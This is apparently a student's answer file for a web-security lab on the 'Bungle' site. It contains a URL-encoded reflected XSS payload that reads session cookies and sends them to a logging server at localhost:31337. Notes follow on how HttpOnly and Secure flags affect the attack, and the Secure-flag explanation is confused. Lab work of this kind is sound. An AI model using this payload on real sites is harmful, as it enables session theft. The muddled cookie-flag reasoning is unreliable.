@@ -1,0 +1,13 @@
+http://localhost/project2/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20var%20cookies%20%3D%20document.cookie%3B%0A%20%20%20%20alert(%22csrf%20token%3A%20%22%20%2B%20cookies)%3B%0A%20%20%20%20%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%3B%0A%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%20%20%20%20%7D%20catch(e)%20%7B%7D%0A%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20%20%20%24(%22html%22).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event%3A%20%22nav%22%2C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20uri%3A%20href%2C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20accessible_cookies%3A%20document.cookie%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20proxy(%22.%2F%22)%3B%0A%7D%3Bpayload('http%3A%2F%2Flocalhost%3A31337%2F')%3B%3C%2Fscript%3E
+
+Note: Within the url, change the line "...csrfdefense=1..." to csrfdefense=2 for part b, or csrfdefense=3 for part c.
+
+The script is simply getting the cookie from the bungle session, and have it be outputted in the alert box.
+
+For part a, this script will work since there are no defenses on the server from an outside attacker. This means the JS can read the cookie directly, and can therefore be sent out.
+
+For part b, this script WILL NOT work since the cookie can't be accessed from the script. Since the HTTPOnly flag is enabled, attempting this function will essentially just return an empty string. JS won't be allowed to read it.
+
+For part c, this WILL work as the site is under HTTP, not HTTPS. The secure flag will essentially filter out any non-http transmission. HOWEVER, since the site itself is on HTTP and not HTTPS, this flag is basically ignored. Therefore the script will be able to read document.cookie. This would work if Bungle was on HTTPS.
+
+NOTE, ALL COLLABORATORS/REFERENCES ARE WITHIN THE HTML FILES ON TOP.
